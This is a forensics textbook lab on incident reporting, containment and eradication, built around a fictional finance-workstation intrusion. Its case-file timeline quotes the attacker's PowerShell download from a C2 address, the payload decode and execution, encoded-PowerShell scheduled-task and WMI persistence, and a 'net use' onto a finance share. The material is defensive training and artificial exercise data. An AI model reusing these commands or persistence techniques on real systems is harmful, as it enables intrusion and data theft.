# Lab 13 — Reporting, Containment, and Recovery

**Supporting [Chapter 13: Reporting, Containment, and Recovery](../../Book/Chapter13.md)**
*Windows Forensics for Beginners: A Practical Guide for Incident Responders*

---

## Overview

Every lab up to this point has ended with evidence. This one starts with it.

You already have the WKSTN-221 intrusion. You parsed its file system in Lab 04, hunted its event logs in Lab 09, and built its timeline in Lab 10. You also have the HR-WS17 exfiltration case from the Lab 11 capstone. Nothing new needs parsing. What remains is the work that decides whether any of that analysis has an effect. You turn findings into documents other people act on. You choose a containment option and defend the evidence you gave up to get it. You decide whether to clean or rebuild a host, and you leave the detection posture better than you found it.

This is a judgment lab, in the same family as Lab 02 and the Chapter 3 capstone. There is no parser to run and no expected row count to match. The deliverables are written artifacts: an executive brief, a set of findings at stated confidence levels, a containment decision record, an eradication checklist, and a lessons-learned entry with a working detection rule in it.

**There is no Hands-On Walkthrough section in this lab, and that is deliberate.** Labs 04 through 11 each had a walkthrough because each had a backing dataset in `Data/` with counts to verify. Lab 13 consumes the *output* of those walkthroughs rather than the data itself. The Case File below quotes the raw material you need, already verified against `Data/WKSTN-221/`. You can work every task from this page even if your earlier notes are thin. If your own Lab 04/09/10/11 notes are in front of you, use them — your numbers should match.

The writing here is the hardest thing in the book to self-assess. That is why `task-answers.md` in this folder carries full worked examples rather than bullet-point hints. Write your version first. Then compare.

---

## What This Lab Covers

This lab supports the following sections from Chapter 13:

| Section | Topic |
|---|---|
| 13.1 | Writing for the Audience That Has to Act |
| 13.2 | The Anatomy of a Defensible Finding |
| 13.3 | Report Structures That Work |
| 13.4 | Containment Without Destroying Evidence |
| 13.5 | Eradication and the Reinfection Question |
| 13.6 | Recovery, Lessons Learned, and the Detection Feedback Loop |

---

## Learning Objectives

By completing this lab, you will be able to:

- Identify the correct audience for each incident artifact and state what gets foregrounded, compressed, and omitted for each
- Separate facts, inferences, and assumptions in a written finding and label each explicitly
- Apply the Confirmed / Probable / Possible / Undetermined scale consistently, including recording Undetermined as a finding with a named missing source
- Write a finding in the four-part form: claim, basis, confidence, what it does not establish
- Detect and rewrite the standard failure patterns in forensic prose — undefined hedges, impression adjectives, unqualified negatives, inferences dressed as observations
- Rank containment options for a specific host by their cost to volatile and persistent evidence, and justify the ranking
- Write a containment decision record that answers a reviewer's questions in advance
- Apply the rebuild-versus-clean criteria to hosts of different roles and reach a defensible call
- Sequence credential rotation in dependency order
- Build an eradication verification checklist tied to the persistence mechanisms the case actually found
- Produce a one-page executive brief that survives the page limit
- Convert a case finding into a Sigma rule and a logging gap into a costed, owned change

---

## Estimated Time and Difficulty

**Difficulty:** Intermediate

**First time through the material:** 3–4 h

**Refresh (already familiar with the chapter):** 60–90 min

> **Key terms used in this lab:** confidence scale, Confirmed, Undetermined, evidence cost, containment, eradication, reinfection, earliest confirmed compromise, executive brief, detection feedback loop, Sigma rule, adversarial reviewer test. See the consolidated [Glossary](../../Book/Glossary.md) for definitions. The chapter cross-references in each entry lead back to the deeper coverage in `Book/`.

---

## Prerequisites

- A text editor or markdown editor. Nothing else — no VM, no parsers, no tooling.
- Your `lab13-notes.md` file (template included in this folder)
- `report-templates.md` from this folder, which you will fill in for Tasks 8, 12, and 13
- Chapter 13 read, particularly §13.2.2 (the confidence scale), §13.4.1 (containment options by evidence cost), and §13.5.3 (rebuild or clean). This lab assumes those three tables are in front of you.

> **Prerequisite outputs from earlier labs.** This lab has no dataset of its own. It runs on what you already produced. Bring the following to the desk before you start:
>
> | From | Bring | Used in |
> |---|---|---|
> | **Lab 04** (`lab04-notes.md`) | Your NTFS findings summary (Task 7) and file-system mini-timeline (Task 6) — the `update.exe` create/rename/execute/delete sequence in `Temp\` | Tasks 2, 3, 4 |
> | **Lab 09** (`lab09-notes.md`, `hunt-pack.md`) | Your "strong support vs. overclaim" table (Task 10) and your hunt pack. Task 13 of this lab feeds new content back into that hunt pack. | Tasks 6, 13 |
> | **Lab 10** (`lab10-notes.md`, `wkstn221-timeline.csv` or `merged-timeline.csv`) | Your curated WKSTN-221 timeline and the Task 10 narrative paragraph. The executive brief in Task 12 is that narrative compressed and translated. | Tasks 4, 5, 12 |
> | **Lab 11** (`lab11-notes.md`, Task 12 case summary) | Your HR-WS17 channel-analysis table and 1–3 page case summary — the book's other worked example of confidence-labelled findings | Tasks 1, 5, 9 |
>
> If you have not completed those labs, you can still do every task in Lab 13. The Case File below reproduces the evidence you need, and `Data/WKSTN-221/README.md` and `Data/HR-WS17/README.md` carry the scenario summaries. The exercise is more useful, though, when you rewrite your *own* prose rather than the lab's.

---

## Scenario

It is **17:30 UTC on 2024-11-14**. You are the analyst on IR-2024-11-014.

About three hours ago, at 14:23, the SOC escalated an EDR alert on **WKSTN-221**, a finance workstation assigned to `payroll-admin`. You have spent the afternoon working the triage collection. You know what happened on that host between 14:18 and 14:35 UTC in some detail. You know rather less about anything else.

Three things are happening at once:

1. **The CFO wants a brief at 18:00 UTC.** Someone in her leadership meeting told her "there was a hack in finance." She now wants to know whether payroll data has been stolen and whether she needs to tell anyone. You have 30 minutes and one page.
2. **WKSTN-221 has not been contained.** At 14:25 IR decided to monitor and collect before isolating, and that decision has not been revisited. The host is still on the network, still powered on, `payroll-admin` is still logged in, and the C2 address is still reachable from the finance VLAN. The IR manager wants a containment recommendation with the evidence cost stated. He wants it before the CFO brief so he can say containment is under way.
3. **Two other hosts are now in scope and neither has been touched.** `FILESVR-03` (10.0.4.18) hosts the `Finance$` share, and WKSTN-221 authenticated to it at 14:33. The second, `10.0.4.17`, is a host inside your own network that pulled 4.2 MB off WKSTN-221 over SMB. It does not appear in the asset inventory at all, and nobody knows what it is.

Tasks 1 through 8 are set at this moment. **Tasks 9 through 13 are set three days later**, on 2024-11-17. By then containment has held, the file server has been reviewed, and the incident is moving into eradication, recovery, and post-incident review. The lab tells you when the clock moves.

A second, unrelated case is also open on your desk: **IR-2024-11-009**, the HR-WS17 departing-employee exfiltration from the Lab 11 capstone. It appears in this lab only where the audience changes. Legal and HR read that one, which makes it a useful contrast to a live intrusion with a CFO waiting.

### The environment

| | |
|---|---|
| Domain | `finance.local` (single domain, two DCs: DC01, DC02) |
| WKSTN-221 | Physical desktop, 10.0.4.32, Windows 11 23H2. EDR agent installed and healthy. Not a VM. |
| FILESVR-03 | 10.0.4.18, Windows Server 2019, VMware VM on a cluster your team has hypervisor access to. Hosts `Finance$`. Roughly 40 concurrent users during business hours. **No EDR agent** — servers were excluded from the rollout on performance grounds. |
| 10.0.4.17 | Unidentified. Not in the CMDB. DHCP lease exists but the MAC does not match any inventoried asset. Annotated in the triage flow data as an adversary-controlled pivot. |
| Logging | Security log 20 MB on workstations, wraps in roughly 36 hours. PowerShell Script Block Logging **is** enabled (that is why you have the 4104 events). No Windows Event Forwarding. No host DNS query logging. Perimeter firewall flow records retained 14 days. No packet capture anywhere. |
| Backups | FILESVR-03 backed up nightly at 01:00 UTC to a backup appliance on the same domain. |

### Response actions so far

| Time (UTC) | Action | By |
|---|---|---|
| 14:21 | EDR raises an alert on the `OUTLOOK.EXE` → `POWERSHELL.EXE` process chain | EDR platform |
| 14:23 | Alert triaged and escalated to the IR team | SOC |
| 14:25 | Decision recorded: monitor and collect before isolating (the Lab 02 case log entry) | IR |
| 15:10 | Triage collection begun on WKSTN-221. Disk and log artifacts only — no memory capture attempted | IR |
| 17:20 | FILESVR-03 and `10.0.4.17` identified as in scope from the 14:31–14:35 activity | IR |
| 17:30 | **Now.** Nothing contained. Nothing collected from either additional host | — |

> The lab supplies these response-side timestamps. They do not appear in `Data/WKSTN-221/`, which contains host artifacts only. Tasks 12 and 13 need them — you cannot measure time-to-detect or time-to-contain without a response clock.

---

## Background: The Case File

Everything in this section is verified against `Data/WKSTN-221/`. Where a figure comes from a specific CSV, the table names the file so you can go back and check it. Byte counts, run counts, and timestamps are exact. Do not round or soften them in your findings.

### Timeline of the WKSTN-221 intrusion (all times UTC, 2024-11-14)

| Time | Event | Source |
|---|---|---|
| 04:00:00–04:00:42 | Four failed network logons (EID 4625, type 3) for `admin`, `administrator`, `root`, `svc-admin` from `185.193.126.47` | `security-evtx.csv` |
| 08:43:17 | `payroll-admin` interactive logon (EID 4624, type 2) — normal start of day | `security-evtx.csv` |
| 13:55:00 | System time changed: previous `13:54:58`, new `13:55:00` (Kernel-General EID 1, +2 s) | `system-evtx.csv` |
| 14:18:55 | LNK file created for `Q4_Payroll_Review.xlsm` | `lnk-files.csv` |
| 14:19:38 | `OUTLOOK.EXE` spawns `POWERSHELL.EXE` with `-EncodedCommand` (EID 4688) | `security-evtx.csv` |
| 14:19:38 | Script block logged (EID 4104): `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp` | `powershell-evtx.csv` |
| 14:19:42–14:19:48 | Outbound TCP/443 to `91.214.47.22`, owning process `powershell.exe` — **1,847 bytes sent, 184,221 bytes received** | `network-flow.csv` |
| 14:19:42–14:19:48 | `a.tmp` created in `Temp\` at 14:19:42.6 (MFT entry 22421) and written until 14:19:48, while the download runs — **174,080 bytes** | `mft.csv`, `usn-journal.csv` |
| 14:20:07 | Script block reads `a.tmp` as a byte array, XOR-decodes it, writes `b.tmp`, and deletes `a.tmp` | `powershell-evtx.csv` |
| 14:20:11 | `b.tmp` created and written on MFT entry 22417. `a.tmp` deleted at 14:20:11.1 | `usn-journal.csv` |
| 14:20:11 | Script block `Move-Item $env:TEMP\b.tmp $env:TEMP\update.exe -Force`. Entry 22417 renamed from `b.tmp` to `update.exe` (`RenameOldName` 14:20:11.25, `RenameNewName` 14:20:11.5) | `powershell-evtx.csv`, `usn-journal.csv` |
| 14:20:11 | `update.exe` present in `C:\Users\payroll-admin\AppData\Local\Temp\` on entry 22417, **174,080 bytes**. A rename keeps the MFT record, so the MFT shows only the current name and has no `b.tmp` row | `mft.csv`, `amcache.csv` |
| 14:21:02 | Script block: `Start-Process $env:TEMP\update.exe` | `powershell-evtx.csv` |
| 14:21:03 | `update.exe` executes. Prefetch `UPDATE.EXE-89A4B22C.pf`, **RunCount 1** | `prefetch.csv`, `security-evtx.csv` |
| 14:21:48–14:22:48 | Three further TCP/443 flows to `91.214.47.22`, owning process `update.exe`. The 14:21:55 flow carries **184,221 bytes sent / 2,415,891 bytes received** | `network-flow.csv` |
| 14:22:58 | Scheduled task `\Microsoft\Windows\WindowsUpdate\WindowsUpdateSync` created, author `FINANCE\payroll-admin`, logon trigger, action `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <same payload>`. `LastTaskResult 0x41303` — **never executed** | `scheduled-tasks.csv` |
| 14:23:02 | WMI event subscription created in `root\subscription`: filter `WindowsUpdateFilter` (uptime 200–320 s), consumer `WindowsUpdateConsumer` (`CommandLineEventConsumer`), **binding present**, same encoded payload | `wmi-persistence.csv` |
| 14:23:44 | `update.exe` deleted from `Temp\` | `usn-journal.csv` |
| 14:30:00 | SRUM records `update.exe`: **184,221 bytes sent / 2,415,891 bytes received** | `srum.csv` |
| 14:31:05 | Network logon (EID 4624, type 3, NtLmSsp) for `payroll-admin` from `10.0.4.17` | `security-evtx.csv` |
| 14:31:05–14:33:14 | Inbound SMB session from `10.0.4.17` to WKSTN-221:445 — **11,421 bytes sent to the host, 4,218,421 bytes received from it** | `network-flow.csv` |
| 14:33:18 | Explicit-credential logon (EID 4648), `TargetServerName=FILESVR-03`, `ProcessName=C:\Windows\System32\cmd.exe` | `security-evtx.csv` |
| 14:33:19 | Process creation (EID 4688): `net use \\FILESVR-03\Finance$ /user:FINANCE\payroll-admin` | `security-evtx.csv` |
| 14:33:42–14:35:00 | Outbound SMB from WKSTN-221 to `10.0.4.18` (FILESVR-03) — 184,221 bytes sent, 8,421 received | `network-flow.csv` |
| 14:38:00 | Logoff (EID 4634) for the `10.0.4.17` network session | `security-evtx.csv` |

### Additional case facts

- **`update.exe` hashes** (from `amcache.csv`): SHA-256 `4f8b2c1a8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345`, SHA-1 `a1b2c3d4e5f6789012345678901234567890abcd`. File size 174,080 bytes, the same as `a.tmp`, because XOR decoding preserves length. Amcache records Publisher `Microsoft Corporation` and `ProductName=Update`. Both strings come from the file's own version-info resource, not from a code signature, and the metadata is forged.
- **No sample recovered.** The binary was deleted at 14:23:44 and no copy was carved from unallocated space. There is no malware analysis and there will not be one.
- **No memory capture exists.** WKSTN-221 has not been dumped. The triage collection is disk and log artifacts only.
- **FILESVR-03 has not been collected.** As of 17:30 UTC nothing from that host has been acquired or parsed.
- **`10.0.4.17` is unidentified.** No collection, no asset record, no owner.
- **Persistence found: two mechanisms.** The scheduled task (never ran) and the WMI subscription (live, binding present). Both carry the same encoded payload. Enumeration of Run keys and Services found nothing attacker-authored.
- **Not checked yet:** whether the `update.exe` hash or the C2 address appears anywhere else in the estate.

### One deliberately weak finding

A colleague wrote this paragraph at 16:50 and dropped it into the draft report. You will rewrite it several times.

> **Draft Finding 4.** *The attacker appears to have been a sophisticated actor. After gaining access to WKSTN-221 via a phishing email, they quickly established persistence and moved laterally through the finance environment using advanced techniques. They likely exfiltrated a significant amount of sensitive payroll data to their command-and-control server at 91.214.47.22 before we were able to respond. No evidence of further lateral movement was identified. The host has been cleaned and returned to the user.*

---

## Lab Tasks

---

### Task 1 — Sort the Output by Audience

**Objective:** Establish who is reading what before writing anything, and name what each reader must not be given.

Chapter §13.1.1 lists seven audiences. Five of them are live on IR-2024-11-014 right now. On IR-2024-11-009 (HR-WS17), legal counsel reads alongside HR. HR is not one of the seven. It is an extra audience that this insider case adds.

Complete the table. For each audience, state the *decision* they are about to make — not their job title, their decision. Then name one specific item from the Case File you would foreground and one you would deliberately leave out.

| Audience | The decision they are making in the next 24 h | One Case File item to foreground | One to omit, and why | Failure mode if you get it wrong |
|---|---|---|---|---|
| Incoming responder (night shift, IR-2024-11-014) | | | | |
| IR manager | | | | |
| CFO / executive leadership | | | | |
| Legal counsel | | | | |
| Affected business unit (Finance team lead) | | | | |
| Legal counsel + HR (IR-2024-11-009, HR-WS17) | | | | |

Then answer:

1. Two of the six rows above are the ones Chapter 13 says deserve special care. Which two, and what specifically goes wrong when an analyst writes for them the way they would write for a technical peer?
2. The CFO has already heard "there was a hack in finance" from a third party. Does that change what goes in the brief, or only the order? Justify your answer.
3. Which single Case File item would you refuse to put in *any* of the six documents at this stage, and what would have to change for that to become releasable?

---

### Task 2 — Fact, Inference, Assumption

**Objective:** Separate the three categories structurally, because they fail differently when wrong (§13.2.1).

Label each statement **F** (fact, directly supported by a named artifact), **I** (inference, a conclusion drawn by reasoning), or **A** (assumption, treated as true without direct evidence because the investigation must proceed). For inferences, name the fact underneath. For assumptions, name what moves downstream if the assumption fails.

| # | Statement | F / I / A | Underlying fact, or what breaks if it fails |
|---|---|---|---|
| 1 | Prefetch file `UPDATE.EXE-89A4B22C.pf` records a run count of 1 and a last-run time of 2024-11-14 14:21:03 UTC. | | |
| 2 | `update.exe` executed once on WKSTN-221 at 14:21:03 UTC. | | |
| 3 | The `payroll-admin` user opened `Q4_Payroll_Review.xlsm` at 14:18:55. | | |
| 4 | An LNK file referencing `Q4_Payroll_Review.xlsm` was created at 14:18:55. | | |
| 5 | The WKSTN-221 system clock was accurate to within a few seconds of true UTC across the incident window. | | |
| 6 | The attacker created the WMI event subscription at 14:23:02. | | |
| 7 | A WMI event consumer named `WindowsUpdateConsumer` exists in `root\subscription` with a filter and a binding, created 2024-11-14 14:23:02. | | |
| 8 | `10.0.4.17` is controlled by the attacker. | | |
| 9 | 4,218,421 bytes were transferred from WKSTN-221 to `10.0.4.17` over SMB between 14:31:05 and 14:33:14. | | |
| 10 | The data transferred to `10.0.4.17` consisted of finance documents. | | |

Then answer:

1. Statement 5 is the assumption that the whole timeline rests on. One event in the Case File bears on it directly. Find it, and state whether it strengthens or weakens the assumption.
2. Chapter §13.2.1 says facts, inferences, and assumptions "degrade differently." Take statement 8 and describe concretely what has to be re-argued in the report if it turns out to be wrong.
3. Which of statements 1–10 would you not put in a report at all, in any form? Why?

---

### Task 3 — Rewrite One Finding at Four Confidence Levels

**Objective:** Force the confidence scale to do real work by writing the same subject matter at every level and seeing where each one breaks.

The subject: **what left WKSTN-221 and where it went.**

Write four separate findings about outbound data movement from WKSTN-221, one at each level of the §13.2.2 scale. Each must be a genuine, defensible statement supported by the Case File. You are not writing four versions of the same claim at different strengths. You are finding the claim that is *honestly* Confirmed, the one that is *honestly* Probable, and so on. The confidence level determines which claim you can make, not how boldly you make it.

| Level | Your finding (claim only, one sentence) | The artifacts that put it at this level | The test from §13.2.2, applied |
|---|---|---|---|
| **Confirmed** | | | Could I defend this in a deposition with only the appendix? |
| **Probable** | | | Would I be genuinely surprised to learn I was wrong? |
| **Possible** | | | Can I state the competing explanation? |
| **Undetermined** | | | Which source would have answered this? Name it. |

> **Read the byte counts carefully before you write.** Every flow record in the Case File has a direction. Two of them point the way the draft finding assumes and two of them do not. Most analysts get the case wrong on this task, and they do it by reading a total instead of a direction.

Then answer:

1. Your Undetermined finding names a missing source. Is that source missing because it was cleared, because it was never retained, because it was never generated, or because nobody has collected it yet? Which of those four is the most embarrassing to write down, and why is it still the one you must write down?
2. Rule 2 in §13.2.2 says every finding carries exactly one level, and that a finding with mixed confidence is more than one finding. Take your Probable finding and check it — is there a clause inside it that is actually only Possible? Split it if so.
3. The draft weak finding says the attacker "likely exfiltrated a significant amount of sensitive payroll data." Using your four findings above, state precisely which parts of that sentence the evidence supports, which it contradicts, and which it neither supports nor refutes.

---

### Task 4 — Build Three Findings in the Four-Part Form

**Objective:** Produce report-ready findings in the §13.2.3 structure: claim, basis, confidence, what this does not establish.

Write three complete findings using the skeleton below. Do not skip the fourth part. It is the one analysts drop, and the one that protects you.

**Finding 1 — Initial access and execution chain.**
**Finding 2 — Persistence established on WKSTN-221.**
**Finding 3 — Lateral movement to FILESVR-03.**

```markdown
**Finding N — [Title: host, account, action].**
**Basis:** [Artifacts, with enough identifying detail — file name, event ID, timestamp,
byte count, run count — that another analyst can retrieve them. Name the source file.]
**Confidence:** [Confirmed / Probable / Possible / Undetermined] — [one clause of reason
if the level is not self-evident]
**What this does not establish:** [The boundary of the claim.]
```

Constraints, all of which a reviewer can enforce:

- Every artifact you cite must be one that actually exists in the Case File. If you want to cite something that is not there, that is a gap, and it belongs in the "what this does not establish" clause instead.
- None of the words on the §13.2.2 banned list may appear: *likely, probably, seems, appears, may have, could have, believed to be, presumably, obviously, clearly, sophisticated, advanced, highly targeted.*
- Finding 2 involves two persistence mechanisms with materially different status — one live, one that never executed. Decide whether that is one finding or two, and be prepared to defend the choice under Rule 2.
- Finding 3 is the hardest. Read what the evidence on WKSTN-221 can and cannot say about what happened *on FILESVR-03*.

Then answer:

1. For Finding 2, did you split or combine? What was the deciding argument?
2. In Finding 3, what is the single artifact from a host you have not collected that would move your confidence up one level? Name the host, the artifact, and the specific field you would look at.
3. Chapter §13.2.4 Example 3 warns about unqualified negatives. Write the sentence you would use to report that Run keys and Services contained nothing attacker-authored — in a form that a hostile reviewer cannot read as "the attacker installed no other persistence."

---

### Task 5 — The Same Finding, Three Audiences

**Objective:** Compress and translate without losing the uncertainty (§13.1.2).

Take **one** finding — the outbound data movement subject from Task 3 — and write it three times.

| Reader | Constraint | Your version |
|---|---|---|
| Incoming responder (night shift) | Artifact-level. Must include at least one named artifact, at least one exact figure, and an explicit "not yet checked" pointing at the top open thread with its file path. | |
| IR manager | No artifact names. Must state current scope, what would grow it, and one concrete resource ask. Under 120 words. | |
| CFO | No event IDs, no IP addresses, no tool names, no hashes. Must say what is not yet known and when you expect to know. **Under 80 words.** | |

Then, as a fourth version, write the same finding for **legal counsel** on IR-2024-11-009 (HR-WS17) instead — the Lab 11 case. Use your Lab 11 channel-analysis table. Counsel's question is narrow: *which of the three named pricing files can we establish left the host, by what route, and at what confidence?*

Then answer:

1. The chapter says the uncertainty does not disappear across the three versions: "It changes form" (§13.1.2). Point at the exact phrase carrying the uncertainty in each of your three IR-2024-11-014 versions.
2. Your CFO version is under 80 words. Name the single most important thing you cut, and state the risk you accepted by cutting it.
3. The HR-WS17 version for counsel is the only one of the four where you should be naming what is *not* established almost as prominently as what is. Why does the legal audience invert the emphasis?

---

### Task 6 — Run the Adversarial Reviewer Test

**Objective:** Read a report in the character of someone who wants it to be wrong (§13.2.5).

Take the draft weak finding from the Case File. Work through it sentence by sentence.

| # | Sentence from the draft | The word or omission that fails | What the evidence actually supports | Verdict |
|---|---|---|---|---|
| 1 | "The attacker appears to have been a sophisticated actor." | | | |
| 2 | "After gaining access to WKSTN-221 via a phishing email…" | | | |
| 3 | "…they quickly established persistence and moved laterally through the finance environment using advanced techniques." | | | |
| 4 | "They likely exfiltrated a significant amount of sensitive payroll data to their command-and-control server at 91.214.47.22…" | | | |
| 5 | "…before we were able to respond." | | | |
| 6 | "No evidence of further lateral movement was identified." | | | |
| 7 | "The host has been cleaned and returned to the user." | | | |

Now apply the five §13.2.5 questions to the draft as a whole:

- Which word in this sentence is doing work the evidence does not support?
- If this artifact could be produced by benign activity, did I say so and rule it out?
- Does any conclusion rest on a single source that I described as if it were several?
- Is any assumption stated only implicitly?
- Would removing one finding collapse three others? Are those dependencies visible?

Finally, rewrite the whole paragraph as a properly formed finding set. Expect it to split into three or four numbered findings. Findings that survive this pass are usually shorter and more heavily caveated than the first draft (§13.2.5). That is the correct direction.

> **One item in the Case File is an analyst annotation rather than an artifact.** The `Notes` column in `network-flow.csv` reads "Large outbound transfer — possible exfil" against the 14:21:55 flow. Look at that flow's byte counts. Decide what the annotation is worth as evidence, and write one sentence for your notes about how to treat parser output that contains a human's opinion column in a finding's Basis.

Then answer:

1. Sentence 7 is a claim about *response actions*, not about the intrusion. Why is it more dangerous in this report than any of the six forensic sentences above it?
2. Of the five §13.2.5 questions, which one does the draft fail most severely? Quote the specific dependency or hidden single source.
3. You are the reviewer, not the author. The author is a peer who worked the case with you and is tired. Write the two-sentence message you would actually send them.

---

### Task 7 — Rank Containment Options by Evidence Cost

**Objective:** Choose which evidence loss you are accepting, per host, and be able to defend the choice (§13.4.1).

The clock is 17:30 UTC. Nothing has been contained. Three hosts are in play, and their properties differ. Re-read the environment table in the Scenario before you start.

**Part A — Rank the options for each host.** Use the §13.4.1 option list: monitor only, perimeter/DNS block of C2, account disable, EDR host isolation, VLAN quarantine, physical disconnect, hypervisor suspend + snapshot, graceful shutdown, hard power-off. Rank your top three per host, most preferred first.

| Host | 1st choice | 2nd choice | 3rd choice | The option you rule out immediately, and why |
|---|---|---|---|---|
| WKSTN-221 (physical, EDR healthy, user logged on, live) | | | | |
| FILESVR-03 (VM you control, no EDR, 40 users, unknown state) | | | | |
| 10.0.4.17 (unidentified, no asset record, adversary-controlled) | | | | |

**Part B — State the evidence cost of your first choice for each host.**

| Host | Chosen option | Evidence it preserves | Evidence it destroys or costs | Is that loss acceptable? Why |
|---|---|---|---|---|
| WKSTN-221 | | | | |
| FILESVR-03 | | | | |
| 10.0.4.17 | | | | |

**Part C — Sequence.** Chapter §13.4.5 argues for containing broadly and at once rather than one host at a time, once scope is understood. Chapter §13.4.2 gives a memory-first default sequence. Reconcile them for this incident: write the ordered action list from 17:30 UTC, with a time estimate against each step.

| # | Time (UTC) | Action | Host | Why this position in the sequence |
|---|---|---|---|---|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |
| 6 | | | | |
| 7 | | | | |
| 8 | | | | |

Then answer:

1. One of the three hosts has an option available to it that costs essentially no evidence at all, and Chapter 13 says responders routinely forget it. Which host, which option, and why is it forgotten?
2. The `payroll-admin` account is the attacker's confirmed identity on this incident. Disabling it looks free — it does not touch any host. State two specific things it costs you if you do it at 17:35 UTC, before anything else in your sequence.
3. You cannot isolate `10.0.4.17` because you cannot find it. Write the three-step plan to locate it, in the order you would execute it, using only the evidence in the Case File plus infrastructure you would reasonably have.
4. What single new fact arriving at 17:45 would make you abandon your entire Part C sequence and cut the network immediately?

---

### Task 8 — Write the Containment Decision Record

**Objective:** Produce the case log entry that answers a reviewer's questions in advance (§13.4.4).

Chapter §13.4.4 requires five things: the time, the option chosen, the authorizing person, the reason, and the evidence cost accepted. The worked example in the chapter adds a sixth that is worth keeping — a named trigger for reassessment.

Write the containment decision record for **WKSTN-221**, then for **FILESVR-03**. Use the skeleton in `report-templates.md` (§3, Containment Decision Record). Each should be a single dense paragraph or a short structured block — not a page.

Your record must survive this test: hand it to someone who was not there, nine months from now, and they should not need to ask you a single question about *why*.

| Field | WKSTN-221 | FILESVR-03 |
|---|---|---|
| Time (UTC) | | |
| Option chosen | | |
| Authorized by | | |
| Reason this option and not the next one down the list | | |
| Evidence cost accepted (be specific about categories) | | |
| Reassessment trigger | | |
| What was captured before containment, with tool and hash reference | | |

Then answer:

1. Chapter 13 says writing this entry takes 90 seconds and reconstructing it nine months later is not possible. Time yourself. How long did the WKSTN-221 one actually take, and which field slowed you down?
2. Your record names an authorizing person. What happens to the record — and to you — if that person later says they do not recall authorizing it? What in your record protects against that?
3. FILESVR-03 has 40 concurrent users and a business owner who will object. Where in the record does that objection belong: in the reason, in the evidence cost, or somewhere else entirely?

---

> **The clock moves. Tasks 9 through 13 are set on 2024-11-17, three days later.**
>
> What has happened since: containment held. WKSTN-221 memory was captured at 17:35–18:04 on 14 November and the host was isolated at 18:20. FILESVR-03 was snapshotted at 18:05. The FILESVR-03 review showed the `net use` session at 14:33 and directory enumeration of `Finance$`, but no file reads beyond directory listings and no attacker binary. The team located `10.0.4.17`: an unmanaged Windows host under a desk in a decommissioned lab space, joined to the domain 18 months ago and never inventoried. Its disk was imaged. An EDR hunt across the estate found the `update.exe` hash on no other host. Flow records show the C2 address only for WKSTN-221 and `10.0.4.17`. Nothing new has appeared in three days of elevated monitoring.
>
> Everything else in the Case File is unchanged. In particular: still no memory image from the intrusion window, still no malware sample, still no host DNS logging, and the Security log on WKSTN-221 still wraps in roughly 36 hours.

---

### Task 9 — Rebuild or Clean

**Objective:** Apply the §13.5.3 criteria to three hosts of different roles and reach a defensible call on each.

Score each host against the eight factors. Then decide. Then write the one-sentence justification you would put in Section 6 of the incident report.

| Factor | WKSTN-221 | FILESVR-03 | 10.0.4.17 |
|---|---|---|---|
| Attacker access level | | | |
| Tooling observed | | | |
| Persistence found | | | |
| Kernel-level activity | | | |
| Dwell time | | | |
| Host role | | | |
| Rebuild cost | | | |
| Confidence in scope | | | |
| **Decision (rebuild / clean)** | | | |
| **One-sentence justification** | | | |

Now add a fourth column for **HR-WS17** from Lab 11. That case has no intrusion at all. It is an insider exfiltration on a host preserved at offboarding. Work the same eight factors against it and state what the rebuild-or-clean question even means for a host that is already an image sitting in an evidence locker.

Then answer:

1. Chapter §13.5.3 says the default should be rebuild and cleaning is the exception requiring justification. Did any of your three live hosts genuinely justify cleaning? If you said "clean" anywhere, write the justification as if a reviewer is reading it in six months.
2. `10.0.4.17` was joined to the domain 18 months ago and never inventoried. Which of the eight factors does that single fact move, and by how much?
3. The chapter names three host categories where rebuild is mandatory rather than merely preferred. None of the three hosts in this incident is in those categories. Suppose the 14:33 explicit-credential logon had gone to DC02 rather than FILESVR-03 — what changes, and how far does the conversation escalate?

---

### Task 10 — Credential Rotation, In Order

**Objective:** Sequence rotation in dependency order so you are not rotating credentials the attacker re-harvests from a host they still control (§13.5.4).

**Part A — Build the rotation list.** For each of the seven categories in §13.5.4, state whether it applies to this incident, what specifically is in scope, and when in the sequence it happens relative to containment and to service restoration.

| # | Category (§13.5.4) | Applies here? | What specifically | Before or after containment? Before or after restore? | Owner |
|---|---|---|---|---|---|
| 1 | Accounts with confirmed attacker use | | | | |
| 2 | Local administrator passwords on in-scope hosts | | | | |
| 3 | Service accounts present on any compromised host | | | | |
| 4 | Privileged domain accounts | | | | |
| 5 | `krbtgt`, twice | | | | |
| 6 | Bulk user population | | | | |
| 7 | Certificates, API keys, tokens | | | | |

**Part B — The specific decisions this incident forces.**

- `svc-backup` authenticated to WKSTN-221 at 02:14 UTC on 2024-11-14, roughly 12 hours before the intrusion, via a scheduled task (`BackupServiceSync`, `C:\Program Files\BackupAgent\bkupagent.exe`). Was that credential exposed? State your reasoning and the confidence level, then say what you would do about it and what it costs the business if you are wrong in either direction.
- No memory image covers the intrusion window, so you cannot demonstrate credential material in LSASS. Does the absence of a memory capture from that window make the credential-exposure question *easier* or *harder* to answer conservatively? What does a conservative answer look like in the report?
- `10.0.4.17` was domain-joined and unmanaged for 18 months. What does that do to categories 2 and 4?

Then answer:

1. Chapter §13.5.4 says rotation happens after containment and before service restoration. What specifically goes wrong if you rotate on 2024-11-14 at 17:35, before WKSTN-221 is isolated?
2. Category 7 is described as "the category most often forgotten." Name three items in it that plausibly exist in a finance department and would not appear on anyone's rotation list.
3. Item 5 says rotate `krbtgt` twice, with the replication interval between rotations. Is `krbtgt` rotation justified in this incident as scoped on 2024-11-17? Argue both sides, then commit to an answer.

---

### Task 11 — Build the Eradication Verification Checklist

**Objective:** Turn §13.5.1's three questions and §13.5.5's verification pass into a checklist a second responder can execute (§13.5.1, §13.5.5).

**Part A — The three questions, answered with confidence levels.**

| # | Question | Your answer | Confidence | If Possible or Undetermined: the reinfection risk this creates, in one sentence |
|---|---|---|---|---|
| 1 | Have all persistence mechanisms been identified? | | | |
| 2 | Have all attacker-accessible credentials been rotated? | | | |
| 3 | Is the entry point closed? | | | |

**Part B — The persistence verification checklist.** Chapter §13.5.1 names about 15 persistence locations. Build the checklist covering all of them, with the artifact or command you would use to check each on a Windows host. The table pre-fills the two the case actually found as the pattern. Do the rest.

| # | Mechanism | How to check | Found in this case? | Verified clear on (host / date) |
|---|---|---|---|---|
